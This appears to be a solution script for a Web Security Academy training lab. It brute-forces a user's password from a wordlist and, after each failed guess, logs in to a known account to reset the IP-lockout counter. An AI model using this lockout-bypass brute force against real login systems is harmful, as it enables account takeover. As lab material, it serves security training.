import requests
from bs4 import BeautifulSoup

# Global setup
site = '0a2900ac0347977581a352ae00f50069.web-security-academy.net'
login_url = f'https://{site}/login'

# Session object for reuse
s = requests.Session()

def login_wiener():
    """Login to the 'wiener' account to reset the IP lockout counter."""
    logindata = {
        'username': 'wiener',
        'password': 'peter'
    }
    resp = s.post(login_url, data=logindata)

def brute_force_password():
    """Attempt to brute-force the password for 'carlos'."""
    lines = open("auth-lab-passwords", "r").readlines()
    for password in lines:
        target = password.strip()
        logindata = {
            'username': 'carlos',
            'password': target
        }

        # Attempt to login with each password in the list
        resp = s.post(login_url, data=logindata)
        soup = BeautifulSoup(resp.text, 'html.parser')
        warning = soup.find('p', {'class': 'is-warning'})

        # If there is no warning or no mention of 'password' in the message, the login succeeded
        if warning is None or 'password' not in warning.text:
            print(f'[✓] Found password: {target}')
            return target  # Password found, exit the loop

        # Login as 'wiener' to reset IP lockout counter after each failed attempt
        print(f'[-] Incorrect password for "carlos": {target}, logging in as "wiener" to reset lockout...')
        login_wiener()

    print("[-] Password not found.")
    return None

def main():
    print("[*] Trying to brute-force password for 'carlos'...")
    found = brute_force_password()
    if found:
        print(f"[*] Found Carlos' password: {found}")
        print("[*] Now logging in as 'wiener' with known creds...")
        login_wiener()

if __name__ == "__main__":
    main()
